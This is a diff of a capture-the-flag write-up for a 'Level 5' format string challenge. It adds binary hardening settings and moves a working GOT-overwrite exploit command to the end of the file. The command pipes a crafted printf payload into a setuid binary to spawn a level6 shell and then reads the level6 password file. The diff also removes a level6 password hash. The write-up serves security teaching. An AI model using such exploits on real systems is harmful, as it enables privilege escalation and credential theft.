@@ -1,7 +1,16 @@
 ## Level 5 - Format String Vulnerability (GOT Overwrite)
-
-### Challenge Summary
 Binary contains a format string vulnerability in `printf()` that allows arbitrary memory writes via GOT overwrite. The binary reads user input with `fgets()` and passes it directly to `printf()` without a format string.
+
+### Settings
+GCC stack protector support:            Enabled
+Strict user copy checks:                Disabled
+Restrict /dev/mem access:               Enabled
+Restrict /dev/kmem access:              Enabled
+grsecurity / PaX: No GRKERNSEC
+Kernel Heap Hardening: No KERNHEAP
+System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level5/level5
 
 ### Vulnerability Details
 
@@ -24,18 +33,6 @@ Binary contains a format string vulnerability in `printf()` that allows arbitrar
 4. `o()` spawns a shell with level6 privileges (binary is setuid)
 5. Read the password file as level6
 
-### Working Manual Command
-
-```bash
-(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | /home/user/level5/level5
-```
-
-**Then type:**
-```
-cat /home/user/level6/.pass
-```
-
-**Note:** The exploit will spam ~134 million lines of output. Wait for it to complete, then you can type commands.
 
 ### Payload Breakdown
 
@@ -86,14 +83,14 @@ cat /home/user/level6/.pass
   080484bd:  e8 ce fe ff ff  call   8048390 <_exit@plt>
 ```
 
-### Level 6 Password
-
-```
-d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
-```
-
 ### Technical Notes
 - **ASLR:** Disabled on this system, allowing hardcoded addresses
 - **Setuid:** Binary runs as level6, so spawned shell has level6 privileges
 - **Format String Type:** Uses %d (read) and %n (write) specifiers
 - **GOT Overwrite:** Overwrites function pointer in Global Offset Table
+
+### Working Manual Command
+
+(python -c 'print "\x38\x98\x04\x08" + "%134513824d" + "%4$n"' ; cat -) | /home/user/level5/level5
+**Note:** The exploit will spam many lines of empty output. Wait for it to complete when you see the word 512, then you can type commands.
+cat /home/user/level6/.pass
